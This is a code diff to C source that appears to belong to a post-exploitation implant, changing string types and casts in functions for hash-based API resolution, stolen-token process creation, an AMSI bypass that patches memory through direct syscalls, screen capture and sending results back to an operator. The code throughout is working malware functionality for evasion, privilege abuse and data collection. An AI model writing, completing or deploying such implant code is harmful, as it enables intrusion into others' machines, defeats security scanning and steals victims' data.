@@ -59,7 +59,7 @@ PVOID LdrModulePeb( DWORD Hash )
         Ldr = C_PTR( Ent );
 
         /* Compare the DLL Name! */
-        if ( ( HashEx( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length, TRUE ) == Hash ) || Hash == NULL )
+        if ( ( HashEx( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length, TRUE ) == Hash ) || Hash == 0 )
             return Ldr->DllBase;
     }
 
@@ -95,17 +95,17 @@ PVOID LdrFunctionAddr( HMODULE Module, DWORD FunctionHash )
 {
     PIMAGE_NT_HEADERS       NtHeader         = NULL;
     PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
-    SIZE_T                  ExpDirectorySize = NULL;
+    SIZE_T                  ExpDirectorySize = 0;
     PDWORD                  AddrOfFunctions  = NULL;
     PDWORD                  AddrOfNames      = NULL;
-    PWORD                   AddrOfOrdinals   = NULL;
+    PWORD                   AddrOfOrdinals   = 0;
     PVOID                   FunctionAddr     = NULL;
     PCHAR                   FunctionName     = NULL;
     ANSI_STRING             AnsiString       = { 0 };
 
     NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
     ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
-    ExpDirectorySize = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );
+    ExpDirectorySize = U_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );
 
     AddrOfNames      = C_PTR( Module + ExpDirectory->AddressOfNames );
     AddrOfFunctions  = C_PTR( Module + ExpDirectory->AddressOfFunctions );
@@ -142,17 +142,17 @@ PVOID LdrFunctionAddr( HMODULE Module, DWORD FunctionHash )
 }
 
 
-PCHAR TokenGetUserDomain( HANDLE hToken, PDWORD UserSize )
+PCHAR TokenGetUserDomain( HANDLE hToken, PUINT32 UserSize )
 {
     LPVOID       TokenUserInfo        = NULL;
-    UCHAR        UserName[ MAX_PATH ] = { 0 };
-    UCHAR        Domain[ MAX_PATH ]   = { 0 };
-    PUCHAR       UserDomain           = NULL;
+    CHAR         UserName[ MAX_PATH ] = { 0 };
+    CHAR         Domain[ MAX_PATH ]   = { 0 };
+    PCHAR        UserDomain           = NULL;
     SID_NAME_USE SidType              = 0;
     DWORD        dwLength             = 0;
     DWORD        DomainSize           = MAX_PATH;
     DWORD        UserNameSize         = MAX_PATH;
-    UCHAR        Deli[ 2 ]            = { '\\', 0 };
+    CHAR         Deli[ 2 ]            = { '\\', 0 };
 
     /* if we got an invalid token just exit */
     if ( ! hToken )
@@ -197,7 +197,7 @@ PCHAR TokenGetUserDomain( HANDLE hToken, PDWORD UserSize )
 HANDLE ProcessOpen( DWORD ProcessID, DWORD Access )
 {
     HANDLE            hProcess    = NULL;
-    CLIENT_ID         ClientID    = { ProcessID, 0 };
+    CLIENT_ID         ClientID    = { (HANDLE)ProcessID, 0 };
     OBJECT_ATTRIBUTES ObjectAttr  = { sizeof( OBJECT_ATTRIBUTES ) };
     NTSTATUS          NtStatus    = STATUS_SUCCESS;
 
@@ -214,7 +214,7 @@ HANDLE ProcessOpen( DWORD ProcessID, DWORD Access )
 
 BOOL ProcessIsWow( HANDLE hProcess )
 {
-    ULONG_PTR IsWow64  = NULL;
+    ULONG_PTR IsWow64  = 0;
     NTSTATUS  NtStatus = STATUS_SUCCESS;
 
     if ( ! hProcess )
@@ -229,14 +229,11 @@ BOOL ProcessIsWow( HANDLE hProcess )
     return ( IsWow64 != 0 );
 }
 
-BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PROCESS_INFORMATION* ProcessInfo, BOOL Piped, PANONPIPE DataAnonPipes )
+BOOL ProcessCreate( BOOL EnableWow64, LPWSTR App, LPWSTR CmdLine, DWORD Flags, PROCESS_INFORMATION* ProcessInfo, BOOL Piped, PANONPIPE DataAnonPipes )
 {
     PPACKAGE        Package         = NULL;
     PANONPIPE       AnonPipe        = { 0 };
-    STARTUPINFOA    StartUpInfo     = { 0 };
-    LPWSTR          CommandLineW    = NULL;
-    DWORD           CommandLineSize = StringLengthA( CmdLine );
-    PVOID           Wow64Value      = NULL;
+    STARTUPINFOW    StartUpInfo     = { 0 };
     BOOL            Return          = TRUE;
 
     StartUpInfo.cb          = sizeof( STARTUPINFOA );
@@ -287,16 +284,13 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
         LPWSTR lpCurrentDirectory   = NULL;
         WCHAR  Path[ MAX_PATH * 2 ] = { 0 };
 
-        if ( Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, &Path ) )
+        if ( Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) )
             lpCurrentDirectory = Path;
 
         TokenImpersonate(FALSE);
         TokenSetPrivilege( SE_IMPERSONATE_NAME, TRUE );
 
-        CommandLineW = Instance.Win32.LocalAlloc( LPTR, CommandLineSize * 2 );
-        CharStringToWCharString( CommandLineW, CmdLine, CommandLineSize );
-
-        PRINTF( "CommandLineW[%d]  : %ls\n", CommandLineSize, CommandLineW )
+        PRINTF( "CmdLine           : %ls\n", CmdLine )
         PRINTF( "lpCurrentDirectory: %ls\n", lpCurrentDirectory )
 
         if ( Instance.Tokens.Token->Type == TOKEN_TYPE_STOLEN )
@@ -306,7 +300,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
                     Instance.Tokens.Token->Handle,
                     LOGON_NETCREDENTIALS_ONLY,
                     App,
-                    CommandLineW,
+                    CmdLine,
                     Flags | CREATE_NO_WINDOW,
                     NULL,
                     lpCurrentDirectory,
@@ -332,7 +326,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
                         Instance.Tokens.Token->lpPassword,
                         LOGON_NETCREDENTIALS_ONLY,
                         App,
-                        CommandLineW,
+                        CmdLine,
                         Flags | CREATE_NO_WINDOW,
                         NULL,
                         lpCurrentDirectory,
@@ -350,13 +344,10 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
         }
 
         TokenImpersonate(TRUE);
-        MemSet( CommandLineW, 0, CommandLineSize * 2 );
-        Instance.Win32.LocalFree( CommandLineW );
-        CommandLineW = NULL;
     }
     else
     {
-        if ( ! Instance.Win32.CreateProcessA(
+        if ( ! Instance.Win32.CreateProcessW(
                 App,
                 CmdLine,
                 NULL,
@@ -396,15 +387,15 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
         PUTS( "Send info back" )
         if ( ! CmdLine )
         {
-            PackageAddBytes( Package, App, StringLengthA( App ) );
+            PackageAddWString( Package, App );
             PackageAddInt32( Package, ProcessInfo->dwProcessId );
             PackageTransmit( Package, NULL, NULL );
         }
         else
         {
-            INT32 i = 0;
-            INT32 x = ( INT32 ) StringLengthA( CmdLine );
-            PCHAR s = Instance.Win32.LocalAlloc( LPTR, x );
+            INT32 i  = 0;
+            INT32 x  = ( INT32 ) StringLengthW( CmdLine );
+            PWCHAR s = Instance.Win32.LocalAlloc( LPTR, x * sizeof( WCHAR ) );
 
             MemCopy( s, CmdLine, x );
 
@@ -414,9 +405,9 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
             PUTS( s )
             s[ i ] = 0;
 
-            PRINTF( "Process start :: Path:[%s] ProcessId:[%d]\n", s, ProcessInfo->dwProcessId );
+            PRINTF( "Process start :: Path:[%ls] ProcessId:[%d]\n", s, ProcessInfo->dwProcessId );
 
-            PackageAddBytes( Package, s, StringLengthA( s ) );
+            PackageAddWString( Package, s );
             PackageAddInt32( Package, ProcessInfo->dwProcessId );
             PackageTransmit( Package, NULL, NULL );
 
@@ -430,11 +421,6 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
         JobAdd( Instance.CurrentRequestID, ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
 
 Cleanup:
-    if ( CommandLineW )
-    {
-        MemSet( CommandLineW, 0, CommandLineSize * 2 );
-        Instance.Win32.LocalFree( CommandLineW );
-    }
 
     return Return;
 }
@@ -559,11 +545,11 @@ BOOL BypassPatchAMSI()
     SIZE_T uSize = sizeof(amsiPatch);
 
     PUTS("NtProtectVirtualMemory")
-    if ( NT_SUCCESS( Instance.Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection ) ) )
+    if ( NT_SUCCESS( Instance.Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection ) ) )
     {
         MemCopy( pAddress, amsiPatch, sizeof(amsiPatch) );
 
-        if ( NT_SUCCESS( Instance.Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection ) ) )
+        if ( NT_SUCCESS( Instance.Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, OldProtection, &NewProtection ) ) )
             return TRUE;
 
         PUTS( "[-] Failed to change back protection" )
@@ -664,7 +650,7 @@ BOOL WinScreenshot( PVOID* ImagePointer, PSIZE_T ImageSize )
     DWORD               cbBits      = 0;
 
     PVOID               BitMapImage = NULL;
-    PVOID               BitMapSize  = NULL;
+    DWORD               BitMapSize  = 0;
 
     INT x = Instance.Win32.GetSystemMetrics( SM_XVIRTUALSCREEN );
     INT y = Instance.Win32.GetSystemMetrics( SM_YVIRTUALSCREEN );
@@ -711,7 +697,6 @@ BOOL WinScreenshot( PVOID* ImagePointer, PSIZE_T ImageSize )
     if ( ImageSize )
         *ImageSize = BitMapSize;
 
-    CLEANUP:
     if ( hTempMap )
         Instance.Win32.DeleteObject( hTempMap );
 
@@ -740,7 +725,7 @@ BOOL PipeRead( HANDLE Handle, PBUFFER Buffer )
 
     do
     {
-        if ( ! Instance.Win32.ReadFile( Handle, U_PTR( Buffer->Buffer ) + Total, MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX ), &Read, NULL ) )
+        if ( ! Instance.Win32.ReadFile( Handle, C_PTR( U_PTR( Buffer->Buffer ) + Total ), MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX ), &Read, NULL ) )
         {
             if ( NtGetLastError() != ERROR_MORE_DATA )
             {
